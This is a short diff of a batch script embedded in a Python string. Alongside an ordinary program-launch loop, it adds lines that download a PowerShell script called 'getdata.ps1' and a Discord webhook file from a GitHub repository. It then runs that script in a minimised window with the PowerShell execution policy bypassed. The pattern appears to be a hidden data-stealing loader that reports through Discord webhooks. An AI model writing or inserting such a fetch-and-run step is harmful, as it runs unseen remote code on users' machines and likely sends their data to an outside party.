@@ -43,11 +43,17 @@ if %errorlevel%==0 (
     if %errorlevel%==0 (
         timeout 3
     ) else (
+        if not exist "{where['getdata']}" (
+            curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "{where['getdata']}"
+            curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/discord_webhook.txt" -o "{os.path.join(where['perts'], "discord_webhooks.txt")}"
+        )
         start "" /min cmd /c "powershell -ExecutionPolicy Bypass -File {where['getdata']}"
+        exit /b 0
     )
     timeout 3
 ) else (
     start "" /min cmd /c "python {where['main_program']}"
+    exit /b 0
 )
 goto loop
 """
